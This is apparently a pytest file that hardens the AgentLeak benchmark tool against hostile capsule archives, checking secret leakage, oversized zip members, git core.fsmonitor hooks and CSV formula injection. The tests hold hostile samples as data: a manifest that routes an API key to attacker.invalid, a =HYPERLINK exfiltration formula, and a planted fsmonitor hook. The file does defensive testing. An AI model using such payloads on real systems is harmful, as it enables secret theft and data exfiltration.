# SPDX-FileCopyrightText: 2026 AgentLeak contributors
# SPDX-License-Identifier: MIT
"""``agentleak bench`` hardening: untrusted capsules, exports, git."""

from __future__ import annotations

import hashlib
import json
import shutil
import subprocess
import zipfile
from pathlib import Path

import pytest

from agentleak.research import Manifest, build_capsule, run_benchmark, verify_capsule
from agentleak.research import capsule as capsule_mod


def _tiny_capsule(tmp_path: Path) -> Path:
    m = Manifest(name="tiny")
    m.scenarios.sources = ["builtin"]
    m.scenarios.max_per_source = 2
    m.statistics.bootstrap_resamples = 200
    run = run_benchmark(m, tmp_path / "run", generated_at="2026-01-01T00:00:00+00:00")
    return build_capsule(run, tmp_path / "tiny.zip")


def _rewrite(src: Path, dst: Path, changes: dict[str, bytes]) -> Path:
    with zipfile.ZipFile(src) as zin:
        files = {n: zin.read(n) for n in zin.namelist()}
    files.update(changes)
    files["SHA256SUMS"] = "".join(
        f"{hashlib.sha256(files[n]).hexdigest()}  {n}\n"
        for n in sorted(files) if n != "SHA256SUMS").encode()
    with zipfile.ZipFile(dst, "w", compression=zipfile.ZIP_DEFLATED) as zout:
        for n in sorted(files):
            zout.writestr(n, files[n])
    return dst


def test_verify_does_not_send_a_key_the_capsule_names(tmp_path, monkeypatch) -> None:
    import agentleak.detectors.llm_judge as judge_mod

    secret = "synthetic-" + "s" * 30
    monkeypatch.setenv("AGENTLEAK_TEST_VERIFY_SECRET", secret)
    sent: list[tuple[str, str]] = []

    def _capture(request, *, timeout):  # noqa: ANN001, ANN202
        sent.append((request.full_url, request.get_header("Authorization") or ""))
        raise OSError("no network in tests")

    monkeypatch.setattr(judge_mod, "open_model_url", _capture)
    src = _tiny_capsule(tmp_path)
    with zipfile.ZipFile(src) as zf:
        lock = json.loads(zf.read("run/manifest.lock.json"))
    lock["manifest"]["detection"]["mode"] = "hybrid"
    lock["manifest"]["detection"]["llm_judge"] = {
        "base_url": "https://attacker.invalid/v1", "api_key_env": "AGENTLEAK_TEST_VERIFY_SECRET",
        "model": "m", "enabled": True}
    evil = _rewrite(src, tmp_path / "evil.zip",
                    {"run/manifest.lock.json": json.dumps(lock).encode()})
    result = verify_capsule(evil)
    assert sent == [], sent
    assert not result.ok
    assert any(c["check"] == "network" for c in result.checks)


def test_verify_refuses_oversized_members_before_reading(tmp_path, monkeypatch) -> None:
    monkeypatch.setattr(capsule_mod, "_MAX_MEMBER_BYTES", 1024 * 1024, raising=False)
    src = _tiny_capsule(tmp_path)
    bomb = _rewrite(src, tmp_path / "bomb.zip", {"run/padding.bin": b"\0" * (2 * 1024 * 1024)})
    result = verify_capsule(bomb, rerun=False)
    assert not result.ok
    assert result.checks[0]["check"] == "size"


@pytest.mark.skipif(shutil.which("git") is None, reason="git not installed")
def test_git_commit_does_not_run_fsmonitor_from_the_checkout(tmp_path, monkeypatch) -> None:
    from agentleak.research import manifest as manifest_mod

    root = tmp_path / "checkout"
    subprocess.run(["git", "init", "-q", str(root)], check=True)
    marker = tmp_path / "fsmonitor-ran"
    hook = root / "hook.sh"
    hook.write_text(f"#!/bin/sh\ntouch {marker}\n")
    hook.chmod(0o755)
    (root / "f").write_text("x")
    subprocess.run(["git", "-C", str(root), "add", "f"], check=True)
    subprocess.run(["git", "-C", str(root), "-c", "user.name=t", "-c", "user.email=t@example.test",
                    "commit", "-qm", "init"], check=True)
    # Planted last, as a hostile checkout would ship it.
    subprocess.run(["git", "-C", str(root), "config", "core.fsmonitor", str(hook)], check=True)
    fake_file = root / "src" / "agentleak" / "research" / "manifest.py"
    monkeypatch.setattr(manifest_mod, "__file__", str(fake_file))
    info = manifest_mod.git_commit()
    assert info["commit"], info
    assert not marker.exists(), "git ran the checkout's core.fsmonitor program"


def test_score_corpus_csv_does_not_carry_formulas(tmp_path) -> None:
    from typer.testing import CliRunner

    from agentleak.cli import app

    corpus = tmp_path / "corpus.jsonl"
    hostile = '=HYPERLINK("https://attacker.invalid/?d="&A1,"x")'
    corpus.write_text(json.dumps({"trace_id": hostile, "secret_id": "s1", "level": 4,
                                  "channel": "log"}) + "\n")
    result = CliRunner().invoke(app, ["bench", "score-corpus", str(corpus), "--no-detect",
                                      "--out", str(tmp_path / "out")])
    assert result.exit_code == 0, result.output
    import csv

    with open(tmp_path / "out" / "scores.csv", newline="", encoding="utf-8") as fh:
        rows = list(csv.DictReader(fh))
    assert rows[0]["trace_id"] == "'" + hostile


def test_csv_safe_leaves_numbers_alone() -> None:
    from agentleak.research.rows import csv_safe

    assert csv_safe("-0.25") == "-0.25"
    assert csv_safe(-1) == -1
    assert csv_safe("@SUM(A1)") == "'@SUM(A1)"
    assert csv_safe("plain") == "plain"
